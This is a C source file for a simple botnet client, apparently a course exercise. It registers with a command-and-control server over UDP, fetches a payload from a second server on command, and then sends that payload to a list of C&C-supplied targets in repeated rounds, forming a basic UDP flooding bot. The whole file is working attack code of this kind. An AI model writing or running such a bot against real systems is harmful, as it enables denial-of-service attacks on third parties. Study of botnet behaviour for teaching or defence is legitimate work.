#include <arpa/inet.h>
#include <err.h>
#include <errno.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "message.h"
#include "wrappers.h"

#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT "1234"
#define REG_MSG "REG\n"
#define UDP_GREET "HELLO\n"  // TODO what if bot doesnt have payload? what does he send, why is it uninitialized?

/**
 * Converts a MSG structure into an array of ip_port structures.
 * ret is the array to be filled up with struct ip_port values;
 * num_targ the number of actual pairs in message.
 */
void parse_to_array(struct MSG *message, struct ip_port ret[], short num_targ);

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: ./bot server_ip server_port\n");
        exit(0);
    }
    char payload[512];
    bool payload_set = false;
    // short payload_size = 0;

    int sock = Socket(AF_INET, SOCK_DGRAM, 0);  // IPv4 family, datagram socket, default (udp)

    char *outaddr = argc == 3 ? argv[1] : DEFAULT_IP;
    char *outport = argc == 3 ? argv[2] : DEFAULT_PORT; /* Host byte order */

    struct addrinfo hints;
    struct addrinfo *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_protocol = 0;

    struct sockaddr_in addr;
    Getaddrinfo(outaddr, outport, &hints, &res);
    memcpy(&addr, res->ai_addr, sizeof(struct sockaddr_in));

    //                                     ,--> avoid sending null term to cnc when registering
    Sendto(sock, REG_MSG, sizeof(REG_MSG) - 1, 0, (struct sockaddr *)&addr, sizeof(addr));

    struct MSG data;
    socklen_t fromaddrlen = sizeof(addr);
    int rec = -2;
    while (1) {
        memset(&data, '0', sizeof(data));
        rec = Recvfrom(sock, &data, sizeof(data), 0, (struct sockaddr *)&addr, &fromaddrlen);

        int command = data.command - '0';
        if (command == 0) {
            struct sockaddr_in udp_addr;
            struct addrinfo *resudpserv;
            Getaddrinfo(data.IP1, data.PORT1, &hints, &resudpserv);
            memcpy(&udp_addr, resudpserv->ai_addr, sizeof(struct sockaddr_in));
            freeaddrinfo(resudpserv);

            Sendto(sock, UDP_GREET, sizeof(UDP_GREET) - 1, 0, (struct sockaddr *)&udp_addr, fromaddrlen);
            Recvfrom(sock, &payload, sizeof(payload), 0, (struct sockaddr *)&udp_addr, &fromaddrlen);
            printf("Successfully obtained payload from UDP server, payload is %s\n", payload);
            payload_set = true;
        } else if (command == 1) {
            if (!payload_set) {
                printf("Didn't recieve payload yet!\n");
                continue;
            }
            struct ip_port targets[20];
            short num_of_targets = (rec - sizeof(char)) / sizeof(struct ip_port);
            parse_to_array(&data, targets, num_of_targets);

            struct sockaddr_in targaddr;
            targaddr.sin_family = AF_INET;

            for (int rnd = 0; rnd < 15; rnd++) {
                for (int i = 0; i < num_of_targets; i++) {
                    printf("Sending to %s %s\n", targets[i].IP, targets[i].PORT);
                    struct addrinfo *res;
                    Getaddrinfo(targets[i].IP, targets[i].PORT, &hints, &res);
                    memcpy(&targaddr, res->ai_addr, sizeof(struct sockaddr_in));
                    freeaddrinfo(res);
                    Sendto(sock, payload, strlen(payload), 0, (struct sockaddr *)&targaddr, sizeof(targaddr));
                }
                sleep(1);
            }

        } else {
            printf("Recieved unknown command\n");
        }
    }
    return 0;
}

void parse_to_array(struct MSG *message, struct ip_port ret[], short num_targ) {
    for (int i = 0; i < num_targ; i++) {
        memcpy(ret[i].IP, message->IP1 + i * sizeof(struct ip_port), INET_ADDRSTRLEN);
        memcpy(ret[i].PORT, message->PORT1 + i * sizeof(struct ip_port), 22);
    }
    return;
}
